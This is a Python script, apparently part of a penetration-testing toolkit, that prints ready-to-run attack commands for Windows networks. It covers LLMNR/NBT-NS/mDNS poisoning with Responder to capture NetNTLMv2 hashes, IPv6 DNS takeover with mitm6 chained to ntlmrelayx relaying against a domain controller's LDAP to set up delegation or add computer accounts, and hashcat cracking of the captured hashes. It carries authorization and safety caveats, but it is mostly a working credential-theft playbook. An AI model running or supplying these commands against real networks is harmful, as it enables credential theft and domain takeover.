#!/usr/bin/env python3
"""LLMNR/NBT-NS/mDNS POISONING + IPv6 takeover -> capture NetNTLM (the #1 internal first-credential).
Drives Responder + mitm6. PRINTS commands. Authorized engagements only — poisoning affects the whole
broadcast/VLAN; run analyze-mode first and coordinate with the client (it's noisy + can disrupt).

Usage:
  python3 gen_poison.py responder [--iface eth0]     # LLMNR/NBT-NS/mDNS spoof -> NetNTLMv2
  python3 gen_poison.py mitm6     [--domain corp.local]  # IPv6 DNS takeover -> WPAD -> creds/relay
  python3 gen_poison.py crack                          # crack the captured hashes
"""
import sys
import _network_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "responder"
iface = opt("--iface", "eth0")
dom   = opt("--domain", P.DOMAIN or "corp.local")

if arg == "responder":
    print(f"# RESPONDER — answer LLMNR/NBT-NS/mDNS name lookups; victims that mistype a share auth to YOU.")
    print(f"# 1) ANALYZE first (passive — see what's resolvable WITHOUT poisoning; low risk):")
    print(f"responder -I {iface} -A")
    print(f"# 2) poison + capture NetNTLMv2 (hashes land in /usr/share/responder/logs/ + the console):")
    print(f"responder -I {iface} -wv                          # LEAVE RUNNING; wait for a victim name lookup")
    print(f"#    -> ok: console prints  '[SMB] NTLMv2-SSP Hash : <user>::<DOMAIN>:...'  (that whole line = the hash)")
    print(f"# 3) IMPORTANT — if you plan to RELAY instead of crack, turn OFF Responder's SMB+HTTP servers")
    print(f"#    (edit /etc/responder/Responder.conf: SMB=Off HTTP=Off) so ntlmrelayx can bind — see gen_relay.py.")
    print(f"# -> captured NetNTLMv2: crack (gen_poison.py crack) OR relay (gen_relay.py).")
    print(f"# NOTE: NetNTLMv2 canNOT be pass-the-hash'd — you must crack it or relay it.")

elif arg == "mitm6":
    print(f"# mitm6 — become the IPv6 DNS server (Windows prefers IPv6); redirect WPAD -> your proxy -> creds/relay.")
    print(f"# run mitm6 + ntlmrelayx together (this is the classic no-creds -> domain path):")
    print(f"mitm6 -d {dom} -i {iface}")
    print(f"# in another terminal, relay the coerced auth to LDAP (RBCD / add-computer):")
    print(f"ntlmrelayx.py -6 -t ldaps://<DC-IP> -wh wpad.{dom} --delegate-access")
    print(f"#   --delegate-access sets up RBCD; or --add-computer to create a computer account you control.")
    print(f"# SAFETY: mitm6 disrupts IPv6 on the segment — time-box it, coordinate, and clean up (Ctrl-C stops it).")

elif arg == "crack":
    print(f"# crack captured NetNTLMv2 (Responder logs or a .txt you saved):")
    print(f"hashcat -m 5600 netntlmv2.txt {P.PASSLIST}     # NetNTLMv2")
    print(f"hashcat -m 5500 netntlmv1.txt {P.PASSLIST}     # NetNTLMv1 (old)")
    print(f"# -> cracked password: reuse it -> gen_shell.py / gen_spray.py (it's a valid domain cred).")
else:
    print("use: responder | mitm6 | crack"); sys.exit(1)
